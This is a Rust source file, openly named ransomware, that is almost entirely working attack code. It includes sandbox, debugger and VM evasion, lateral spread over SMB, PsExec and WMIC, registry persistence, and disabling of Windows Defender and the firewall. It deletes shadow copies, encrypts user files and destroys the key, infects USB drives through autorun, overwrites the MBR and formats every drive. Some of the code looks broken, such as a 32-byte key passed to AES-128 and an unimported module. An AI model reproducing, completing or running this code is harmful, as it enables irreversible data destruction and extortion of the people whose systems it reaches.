use std::fs::{File, remove_file, OpenOptions};
use std::io::{self, Write, Read};
use std::io::Seek;
use std::io::SeekFrom;
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use walkdir::WalkDir;
use rand::RngCore;
use rand::rngs::OsRng;
use std::time::{Duration, Instant};
use aes::Aes128; 
use aes::cipher::{generic_array::GenericArray, BlockEncrypt};
use std::thread;
use aes::cipher::KeyInit;
use std::hash::Hash;
use std::hash::DefaultHasher;
use std::hash::Hasher;

const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const COMMAND_PORT: u16 = 4444;

struct Ransomware {
    encryption_key: Vec<u8>,
    iv: Vec<u8>,
    infected_hosts: Vec<String>,
}

impl Ransomware {
    fn new() -> Result<Self, io::Error> {
        let mut encryption_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        OsRng.try_fill_bytes(&mut encryption_key)?;
        OsRng.try_fill_bytes(&mut iv)?;
        Ok(Ransomware { 
            encryption_key, 
            iv,
            infected_hosts: Vec::new()
        })
    }

    fn check_debugger(&self) -> bool {          
        let output = Command::new("tasklist")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
        let debuggers = [
            "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "windbg.exe",
            "ida.exe", "ida64.exe", "radare2.exe", "processhacker.exe",
            "procmon.exe", "procexp.exe", "pestudio.exe", "wireshark.exe",
            "ghidra.exe", "dnspy.exe", "immunity debugger.exe", "hopper.exe",
            "binary ninja.exe", "hex-rays.exe", "debugview.exe", "cheatengine.exe",
            "fiddler.exe", "charles.exe", "burpsuite.exe", "cutter.exe"
        ];
        
        debuggers.iter().any(|&d| output_str.contains(&d.to_lowercase()))
    }

    fn check_sandbox_artifacts(&self) -> bool {
        let paths = [
            "C:\\agent\\", "C:\\sandbox\\", "C:\\analysis\\",
            "C:\\inetpub\\", "C:\\sample\\", "C:\\virus\\",
            "C:\\malware\\", "C:\\sandbox\\analyst\\",
            "C:\\Program Files\\Cuckoo\\", "C:\\Program Files\\COMODO\\",
            "C:\\Program Files\\Sandboxie\\", "C:\\Program Files\\AnyRun\\",
            "C:\\Joe Sandbox\\", "C:\\Program Files\\Hybrid Analysis\\",
            "C:\\Program Files\\ThreatAnalyzer\\", "C:\\Program Files\\GFI SandBox\\",
            "C:\\Program Files (x86)\\Cuckoo\\", "C:\\Program Files (x86)\\COMODO\\",
            "C:\\Program Files (x86)\\Sandboxie\\", "C:\\Program Files (x86)\\AnyRun\\"
        ];
        
        paths.iter().any(|&p| Path::new(p).exists())
    }

    fn check_system_resources(&self) -> bool {
        let mem_info = sys_info::mem_info().expect("Failed to get memory info");
        let cpu_num = sys_info::cpu_num().expect("Failed to get CPU count");
        let disk_info = sys_info::disk_info().expect("Failed to get disk info");
        
        mem_info.total < 8 * 1024 * 1024 || // Less than 8GB RAM
        cpu_num < 4 || // Less than 4 cores
        disk_info.total < 100 * 1024 * 1024 || // Less than 100GB disk
        mem_info.avail > mem_info.total * 90 / 100 || // More than 90% memory free
        disk_info.free > disk_info.total * 95 / 100 // More than 95% disk free
    }

    fn check_registry_artifacts(&self) -> bool {
        let reg_paths = [
            "HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\DSDT\\VBOX__",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Parallels\\Tools",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxService",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxSF",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmci",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmhgfs",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmrawdsk",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmusbmouse",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmvss",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmemctl",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VMware"
        ];
        
        reg_paths.iter().any(|&path| {
            Command::new("reg")
                .args(&["query", path])
                .output()
                .map(|output| output.status.success())
                .unwrap_or(false)
        })
    }

    fn check_mac_address(&self) -> bool {
        let output = Command::new("getmac")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
        let vm_macs = [
            "00:05:69", "00:0c:29", "00:1c:14", 
            "00:50:56", "08:00:27", "00:16:3e",
            "00:03:ff", "00:1c:42", "00:0f:4b",
            "00:1c:42", "00:1c:14", "00:15:5d",
            "00:21:f6", "00:14:4f", "00:0c:29",
            "00:05:69", "00:0c:29", "00:1c:14",
            "00:1d:c2", "00:e0:4c"
        ];
        
        vm_macs.iter().any(|&mac| output_str.contains(&mac.to_lowercase()))
    }

    fn check_processes(&self) -> bool {
        let output = Command::new("tasklist")
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
        let vm_processes = [
            "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe",
            "vmwaretray.exe", "vmwareuser.exe", "vgauthservice.exe",
            "vmacthlp.exe", "vmusrvc.exe", "prl_tools.exe",
            "qemu-ga.exe", "xenservice.exe", "vmware-vmx.exe",
            "vmware-authd.exe", "vmware-hostd.exe", "vboxheadless.exe",
            "virtualbox.exe", "qemu.exe", "virtualbox.exe",
            "vmware.exe", "vmware-tray.exe", "vmware-unity-helper.exe",
            "parallels.exe", "prl_cc.exe", "prl_tools_service.exe",
            "vboxservice.exe", "virtualboxvm.exe"
        ];
        
        vm_processes.iter().any(|&proc| output_str.contains(&proc.to_lowercase()))
    }

    fn check_hardware_info(&self) -> bool {
        let output = Command::new("wmic")
            .args(&["computersystem", "get", "manufacturer,model"])
            .output()
            .expect("Failed to execute command");
        
        let bios = Command::new("wmic")
            .args(&["bios", "get", "serialnumber,version,manufacturer"])
            .output()
            .expect("Failed to execute command");
            
        let baseboard = Command::new("wmic")
            .args(&["baseboard", "get", "manufacturer,product"])
            .output()
            .expect("Failed to execute command");
        
        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
        let bios_str = String::from_utf8_lossy(&bios.stdout).to_lowercase();
        let baseboard_str = String::from_utf8_lossy(&baseboard.stdout).to_lowercase();
        
        let vm_indicators = [
            "vmware", "virtualbox", "qemu", "xen",
            "innotek gmbh", "parallels", "microsoft corporation",
            "virtual machine", "kvm", "bochs", "hvm domu",
            "bhyve", "smartdc", "openvz", "lxc", "hyperv",
            "virtual", "vmxnet", "vbox", "oracle vm"
        ];
        
        vm_indicators.iter().any(|&ind| 
            output_str.contains(ind) || 
            bios_str.contains(ind) || 
            baseboard_str.contains(ind)
        )
    }
    fn timing_check(&self) -> bool {
        let iterations = 25;  // Increased iterations
        let mut anomalies = 0;
        let mut prev_elapsed = 0;
        
        for i in 0..iterations {
            let start = Instant::now();
            thread::sleep(Duration::from_millis(100));
            let elapsed = start.elapsed();
            
            // More sophisticated timing checks
            if elapsed.as_millis() > 150 || elapsed.as_millis() < 90 {
                anomalies += 1;
            }
            
            // Check for consistent timing patterns
            if i > 0 && (prev_elapsed as i128 - elapsed.as_millis() as i128).abs() < 2 {
                anomalies += 1;
            }
            
            prev_elapsed = elapsed.as_millis();
            
            // More complex random delays
            let delay = (rand::random::<u64>() % 100) + 
                        (rand::random::<u64>() % 50) * 
                        (rand::random::<u64>() % 3);
            thread::sleep(Duration::from_millis(delay));
        }
        
        anomalies > (iterations * 35 / 100)  // Slightly stricter threshold
    }

    fn evade_vm(&self) -> Result<bool, io::Error> {
        let start = Instant::now();
        let duration = Duration::from_secs(900); // Increased to 15 minutes
        
        let mut hasher = DefaultHasher::new();
        let apis = ["LoadLibraryA", "GetProcAddress", "VirtualAlloc", "VirtualProtect", 
                    "CreateThread", "WriteProcessMemory", "ReadProcessMemory", "CreateRemoteThread",
                    "NtCreateThreadEx", "RtlCreateUserThread", "QueueUserAPC", "NtQueueApcThread",
                    "CreateProcessA", "CreateProcessW", "OpenProcess", "CreateFileA", 
                    "CreateFileW", "WriteFile", "ReadFile", "RegOpenKeyExA",
                    "RegOpenKeyExW", "RegSetValueExA", "RegSetValueExW", "RegGetValueA",
                    "InternetOpenA", "InternetOpenW", "InternetConnectA", "HttpOpenRequestA",
                    "HttpSendRequestA", "WSAStartup", "socket", "connect", "send", "recv",
                    "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
                    "NtReadVirtualMemory", "NtOpenProcess", "NtCreateProcess", "NtCreateSection",
                    "NtMapViewOfSection", "NtUnmapViewOfSection", "NtClose", "NtOpenFile",
                    "NtCreateFile", "NtDeviceIoControlFile", "NtDuplicateObject", "NtQuerySystemInformation",
                    "NtQueryInformationProcess", "NtQueryInformationThread", "NtQueryVirtualMemory",
                    "NtQueueApcThread", "NtResumeThread", "NtSuspendThread", "NtTerminateProcess",
                    "NtCreateUserProcess", "NtCreateSymbolicLinkObject", "NtLoadDriver", "NtUnloadDriver"];


        while start.elapsed() < duration {
            for api in apis.iter() {
                api.hash(&mut hasher);
                let hash = hasher.finish();
                
                let mut n = hash;
                for i in 2..((n as f64).sqrt() as u64) {
                    if n % i == 0 {
                        n = n / i;
                        for _ in 0..3000 {  // Increased iterations
                            let _ = n.count_ones();
                            let _ = n.rotate_left(3);
                            let _ = n.reverse_bits();
                            let _ = n.leading_zeros();
                            let _ = n.trailing_zeros();
                            let _ = n.rotate_right(7);
                            let _ = n.wrapping_add(hash);
                            let _ = n.wrapping_mul(i);
                            let _ = n.swap_bytes();
                            let _ = n.checked_add(i);
                            let _ = n.wrapping_sub(hash);
                            let _ = n.rotate_right(11);
                        }
                    }
                }
                
                if rand::random::<u8>() % 5 == 0 {  // Increased frequency
                    let sleep_time = rand::random::<u64>() % 200 +
                                    (rand::random::<u64>() % 75) * 
                                    (rand::random::<u64>() % 5);
                    thread::sleep(Duration::from_millis(sleep_time));
                }
                
                let mut x = hash;
                for _ in 0..1500 {  // Increased iterations
                    x = x.wrapping_mul(x);
                    x = x.rotate_left(3);
                    x ^= n;
                    x = x.rotate_right(7);
                    x = x.wrapping_add(n);
                }
            }
        }
        
        let vm_files = [
            "C:\\Windows\\System32\\Drivers\\VBoxGuest.sys",
            "C:\\Windows\\System32\\Drivers\\vmci.sys",
            "C:\\Windows\\System32\\Drivers\\VMToolsHook.dll",
            "C:\\Windows\\System32\\vmmouse.sys",
            "C:\\Windows\\System32\\vmhgfs.sys",
            "C:\\Windows\\System32\\Drivers\\vmmemctl.sys",
            "C:\\Windows\\System32\\Drivers\\vmrawdsk.sys",
            "C:\\Windows\\System32\\Drivers\\vmusbmouse.sys",
            "C:\\Windows\\System32\\Drivers\\parallel_vm.sys",
            "C:\\Windows\\System32\\Drivers\\prleth.sys",
            "C:\\Windows\\System32\\Drivers\\prlfs.sys",
            "C:\\Windows\\System32\\Drivers\\prlmouse.sys",
            "C:\\Windows\\System32\\Drivers\\prlvideo.sys",
            "C:\\Windows\\System32\\Drivers\\qxldod.sys",
            "C:\\Windows\\System32\\Drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\Drivers\\viostor.sys",
            "C:\\Windows\\System32\\Drivers\\vmgid.sys",
            "C:\\Windows\\System32\\Drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\Drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\Drivers\\vmrawdsk.sys",
            "C:\\Windows\\System32\\Drivers\\vmusbmouse.sys",
            "C:\\Windows\\System32\\Drivers\\vmvss.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet2.sys",
            "C:\\Windows\\System32\\Drivers\\vmxnet3.sys",
            "C:\\Windows\\System32\\Drivers\\vboxsf.sys",
            "C:\\Windows\\System32\\Drivers\\vboxmouse.sys",
            "C:\\Windows\\System32\\Drivers\\vboxguest.sys",
            "C:\\Windows\\System32\\Drivers\\vboxvideo.sys",
            "C:\\Windows\\System32\\Drivers\\qemu-ga.exe"
        ];
        
        for file in vm_files.iter() {
            if Path::new(file).exists() {
                return Ok(true);
            }
        }

        if self.check_debugger() || 
           self.check_sandbox_artifacts() ||
           self.check_system_resources() ||
           self.check_registry_artifacts() ||
           self.check_mac_address() ||
           self.check_processes() ||
           self.check_hardware_info() ||
           self.timing_check() || 
           self.check_registry_artifacts() {  // Added memory artifacts check
            return Ok(true);
        }
        
        Ok(false)
    }
    fn bail_if_vm(&self) -> Result<(), io::Error> {
        if self.evade_vm()? {
            let processes = Command::new("tasklist")
                .output()?;
            
            let output = String::from_utf8_lossy(&processes.stdout);
            if output.contains("VBoxService.exe") || 
               output.contains("vmtoolsd.exe") ||
               output.contains("vmwaretray.exe") ||
               output.contains("vmusrvc.exe") ||
               output.contains("prl_tools.exe") ||
               output.contains("xenservice.exe") ||
               output.contains("qemu-ga.exe") ||
               output.contains("vmware-vmx.exe") ||
               output.contains("VirtualBox.exe") ||
               output.contains("vboxheadless.exe") {
                std::process::exit(0);
            }
            
            // Additional hardware checks before exit
            let cpu_info = Command::new("wmic")
                .args(&["cpu", "get", "name"])
                .output()?;
            
            let cpu_str = String::from_utf8_lossy(&cpu_info.stdout);
            if cpu_str.contains("QEMU") || 
               cpu_str.contains("Virtual") || 
               cpu_str.contains("AMD-V") {
                std::process::exit(0);
            }
        }
        
        Ok(())
    }
    fn network_spread(&mut self) -> Result<(), io::Error> {
        // Scan multiple subnets for potential targets
        let subnets = ["192.168.1", "192.168.0", "10.0.0", "172.16.0"];
        
        for subnet in subnets.iter() {
            for i in 1..255 {
                let target = format!("{}.{}", subnet, i);
                
                // Try multiple ports
                let ports = [COMMAND_PORT, 445, 139, 135];
                
                for port in ports.iter() {
                    if let Ok(mut stream) = TcpStream::connect_timeout(
                        &format!("{}:{}", target, port).parse().unwrap(),
                        Duration::from_secs(1)
                    ) {
                        // Send encryption details
                        stream.write_all(&self.encryption_key)?;
                        stream.write_all(&self.iv)?;
                        stream.flush()?;
                        
                        // Track successful infection
                        if !self.infected_hosts.contains(&target) {
                            self.infected_hosts.push(target.clone());
                            self.replicate_to_target(&target)?;
                        }
                        
                        break;
                    }
                }
            }
        }
        Ok(())
    }
    fn replicate_to_target(&self, target: &str) -> Result<(), io::Error> {
        let current_exe = std::env::current_exe()?;
        
        // Try multiple methods for replication with improved error handling
        let methods = [
            // PSExec method with timeout
            Command::new("psexec")
                .args(&[format!("\\\\{}", target).as_str(), "-c", "-d", "-f", "-w", "60", current_exe.to_str().unwrap()])
                .output(),
                
            // Admin share method with verification    
            Command::new("cmd")
                .args(&["/C", &format!("xcopy /Y /Q \"{}\" \"\\\\{}\\admin$\\system32.exe\" && verify ON", current_exe.display(), target)])
                .output(),
                
            // Hidden share method with backup
            Command::new("cmd")
                .args(&["/C", &format!("xcopy /Y /Q \"{}\" \"\\\\{}\\C$\\Windows\\system32.exe\" && verify ON", current_exe.display(), target)])
                .output(),
        ];

        // Try each method until one succeeds with retry mechanism
        for method in methods.iter() {
            for _ in 0..3 {  // Retry up to 3 times
                if let Ok(output) = method {
                    if output.status.success() {
                        // Execute the copied file with elevated privileges
                        Command::new("wmic")
                            .args(&["/node:", target, "process", "call", "create", "C:\\Windows\\system32.exe", "runas"])
                            .output()?;
                        return Ok(());
                    }
                }
                std::thread::sleep(Duration::from_secs(1));
            }
        }
        
        Ok(())
    }

    fn hide_process(&self) -> Result<(), io::Error> {
        // Enhanced process hiding
        Command::new("powershell")
            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
            .output()?;
            
        // Add to multiple startup locations
        let current_exe = std::env::current_exe()?;
        let startup_locations = [
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        ];

        for location in startup_locations.iter() {
            Command::new("cmd")
                .args(&["/C", &format!("reg add \"{}\" /v WindowsUpdate /t REG_SZ /d \"{}\" /f", location, current_exe.display())])
                .output()?;
        }
            
        // Advanced process hiding
        Command::new("powershell")
            .args(&["-Command", "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe' -Name Debugger -Value 'systray.exe'"])
            .output()?;
            
        // Comprehensive security disabling
        let security_commands = [
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f"
        ];

        for cmd in security_commands.iter() {
            Command::new("cmd")
                .args(&["/C", cmd])
                .output()?;
        }
            
        Ok(())
    }

    fn copy_to_usb(&self) -> Result<(), io::Error> {
        let current_exe = std::env::current_exe()?;
        for drive in ['D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
            let drive_path = format!("{}:\\", drive);
            if let Ok(_metadata) = std::fs::metadata(&drive_path) {
                let drive_type = Command::new("wmic")
                    .args(&["/C", &format!("volume where \"DriveLetter='{}'\" get DriveType /value", drive)])
                    .output()?;
                
                if String::from_utf8_lossy(&drive_type.stdout).contains("2") {
                    let target_paths = [
                        format!("{}\\system32.exe", drive_path),
                        format!("{}\\explorer.exe", drive_path),
                        format!("{}\\winupdate.exe", drive_path)
                    ];

                    for target_path in target_paths.iter() {
                        if let Ok(_) = std::fs::copy::<_, _>(&current_exe, target_path) {
                            let autorun_content = format!(
                                "[AutoRun]\nopen={}\naction=Open folder to view files\nshell\\open\\command={}\nshell\\explore\\command={}",
                                target_path, target_path, target_path
                            );
                            let autorun_path = format!("{}\\autorun.inf", drive_path);
                            if let Ok(mut autorun_file) = File::create(&autorun_path) {
                                autorun_file.write_all(autorun_content.as_bytes())?;
                                
                                // Hide files
                                Command::new("attrib")
                                    .args(&["+h", "+s", "+r", target_path])
                                    .output()?;
                                Command::new("attrib")
                                    .args(&["+h", "+s", "+r", &autorun_path])
                                    .output()?;
                            }
                        }
                    }
                }
            }
        }
        Ok(())
    }

    fn attack_mbr_bios(&self) -> Result<(), io::Error> {
        let mbr_path = "\\\\.\\PhysicalDrive0";
        let patterns = [
            vec![0xDE; 512],  // Destructive pattern
            vec![0xFF; 512],  // All ones
            vec![0x00; 512],  // All zeros
            vec![0xAA; 512],  // Alternating pattern
        ];

        if let Ok(mut mbr) = OpenOptions::new().write(true).open(mbr_path) {
            for pattern in patterns.iter() {
                for _ in 0..16 {
                    mbr.write_all(pattern)?;
                }
            }
        }

        // Attack multiple memory regions
        let targets = [
            ("\\\\.\\mem", 65536),
            ("\\\\.\\UEFI", 32768),
            ("\\\\.\\PhysicalDrive1", 4096),
        ];

        for (path, size) in targets.iter() {
            if let Ok(mut target) = OpenOptions::new().write(true).open(path) {
                let data = vec![0xFF; *size];
                for _ in 0..32 {
                    target.write_all(&data)?;
                }
            }
        }

        Ok(())
    }
      fn encrypt_file(&self, file_path: &Path) -> Result<(), io::Error> {
        let mut file = File::open(file_path)?;
        let mut data = Vec::new();
        file.read_to_end(&mut data)?;
    
        let padding_len = 16 - (data.len() % 16);
        data.extend(vec![padding_len as u8; padding_len]);
    
        let cipher = Aes128::new(GenericArray::from_slice(&self.encryption_key));
        let mut ciphertext = Vec::with_capacity(data.len());
    
        let mut rng = rand::thread_rng();
        let mut iv = [0u8; 16];
        rng.fill_bytes(&mut iv);
    
        let mut prev_block = GenericArray::clone_from_slice(&iv);
    
        for chunk in data.chunks(16) {
            let mut block = GenericArray::clone_from_slice(chunk);
            for i in 0..16 {
                block[i] ^= prev_block[i];
            }
            cipher.encrypt_block(&mut block);
            ciphertext.extend_from_slice(&block);
            prev_block = block.clone(); 
        }
    
        let encrypted_path = format!("{}.encrypted", file_path.display());
        let mut output_file = File::create(&encrypted_path)?;
        output_file.write_all(&iv)?;
        output_file.write_all(&ciphertext)?;
    
        // Secure file deletion with multiple passes
        let mut file = OpenOptions::new().write(true).open(file_path)?;
        let file_len = data.len();
        let mut rng = rand::thread_rng();
        
        // Multiple overwrite passes
        for _ in 0..7 {
            // Zero pass
            let zeros = vec![0u8; file_len];
            file.seek(SeekFrom::Start(0))?;
            file.write_all(&zeros)?;
            file.sync_all()?;
            
            // Ones pass
            let ones = vec![0xFFu8; file_len];
            file.seek(SeekFrom::Start(0))?;
            file.write_all(&ones)?;
            file.sync_all()?;
            
            // Random pass
            let mut random = vec![0u8; file_len];
            rng.fill_bytes(&mut random);
            file.seek(SeekFrom::Start(0))?;
            file.write_all(&random)?;
            file.sync_all()?;
        }
        
        remove_file(file_path)?;
    
        Ok(())
    }
    
      fn spread_and_encrypt(&self) -> Result<(), io::Error> {
          let target_extensions = vec![
              "doc", "docx", "xls", "xlsx", "ppt", "pptx",
              "pdf", "txt", "rtf", "jpg", "jpeg", "png", 
              "gif", "mp3", "mp4", "zip", "rar", "7z",
              "sql", "mdb", "sln", "php", "asp", "aspx",
              "html", "xml", "psd", "bak", "dat", "csv"
          ];

          for drive in ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
              if let Ok(_) = File::open(format!("{}:\\", drive)) {
                  for entry in WalkDir::new(format!("{}:\\", drive))
                      .follow_links(true)
                      .into_iter()
                      .filter_map(|e| e.ok()) {
                      if entry.file_type().is_file() {
                          if let Some(ext) = entry.path().extension() {
                              if let Some(ext_str) = ext.to_str() {
                                  if target_extensions.contains(&ext_str.to_lowercase().as_str()) {
                                      self.encrypt_file(entry.path())?;
                                  }
                              }
                          }
                      }
                  }
              }
          }

          Ok(())
      }

      fn destroy_system(&self) -> Result<(), io::Error> {
          let drives = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
    
          for drive in drives {
              if let Ok(_) = File::open(format!("{}:\\", drive)) {
                  // Multiple secure format passes
                  for pass in 1..=7 {
                      Command::new("cmd")
                          .args(&["/C", &format!("format {}: /fs:ntfs /p:{} /q", drive, pass)])
                          .output()?;
                  }
              }
          }
    
          Ok(())
      }

      fn disable_recovery(&self) -> Result<(), io::Error> {
          // Delete shadow copies
          Command::new("cmd")
              .args(&["/C", "wmic shadowcopy delete"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "vssadmin delete shadows /all /quiet"])
              .output()?;
          
          // Disable system recovery features
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {default} recoveryenabled No"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"])
              .output()?;
          Command::new("cmd") 
              .args(&["/C", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"])
              .output()?;
          
          // Disable safe mode
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {default} safeboot network"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "bcdedit /set {bootmgr} displaybootmenu no"])
              .output()?;
          
          // Corrupt system files
          Command::new("cmd")
              .args(&["/C", "format C: /fs:ntfs /p:7 /q"])
              .output()?;
          
          Ok(())
      }

      fn disable_security(&self) -> Result<(), io::Error> {
          let services = vec![
              "Windows Defender Service",
              "Windows Defender Antivirus Service", 
              "Windows Defender Firewall",
              "Security Center",
              "Windows Firewall",
              "Windows Time",
              "Windows Update",
              "Windows Search",
              "Windows Management Instrumentation",
              "Windows Event Log",
              "Task Scheduler",
              "System Guard Runtime Monitor Broker",
              "Software Protection",
              "Shell Hardware Detection",
              "Remote Registry",
              "Windows Error Reporting Service",
              "Windows Installer",
              "Windows License Manager Service",
              "Windows Modules Installer",
              "Windows Push Notifications System Service",
              "Windows Security Service",
              "Windows Defender Advanced Threat Protection Service",
              "Microsoft Defender Antivirus Network Inspection Service",
              "Security Health Service"
          ];

          // Stop and disable services
          for service in services {
              Command::new("cmd")
                  .args(&["/C", &format!("net stop \"{}\" /y", service)])
                  .output()?;
              Command::new("cmd")
                  .args(&["/C", &format!("sc config \"{}\" start= disabled", service)])
                  .output()?;
          }

          // Disable Windows Defender
          Command::new("cmd")
              .args(&["/C", "netsh advfirewall set allprofiles state off"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableIOAVProtection $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Add-MpPreference -ExclusionPath C:\\"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableArchiveScanning $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableBehaviorMonitoring $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true"])
              .output()?;
          Command::new("cmd")
              .args(&["/C", "powershell Set-MpPreference -DisableScriptScanning $true"])
              .output()?;

          Ok(())
      }

    fn shred_key(&self) -> Result<(), io::Error> {
        let key_file_path = "key.bin";
        {
            let mut key_file = File::create(key_file_path)?;
            key_file.write_all(&self.encryption_key)?;
        }
        
        let mut rng = rand::thread_rng();
        // Increase number of overwrite passes
        for _ in 0..50 {
            let mut key_file = OpenOptions::new().write(true).open(key_file_path)?;
            
            // Zero pass
            let zeros = vec![0u8; AES_KEY_SIZE];
            key_file.write_all(&zeros)?;
            key_file.sync_all()?;
            
            // Ones pass
            let ones = vec![0xFFu8; AES_KEY_SIZE];
            key_file.write_all(&ones)?;
            key_file.sync_all()?;
            
            // Random pass
            let mut random_data = vec![0u8; AES_KEY_SIZE];
            rng.fill_bytes(&mut random_data);
            key_file.write_all(&random_data)?;
            key_file.sync_all()?;
        }
        
        remove_file(key_file_path)?;
        Ok(())
    }
}

fn main() -> Result<(), io::Error> {
    let mut ransomware = Ransomware::new()?;
    ransomware.evade_vm()?;
    ransomware.hide_process()?;
    ransomware.disable_security()?;
    ransomware.disable_recovery()?;
    ransomware.network_spread()?;
    ransomware.spread_and_encrypt()?;
    ransomware.copy_to_usb()?;
    ransomware.shred_key()?;
    ransomware.bail_if_vm()?;
    ransomware.attack_mbr_bios()?;
    ransomware.destroy_system()?;
    Ok(())
}            
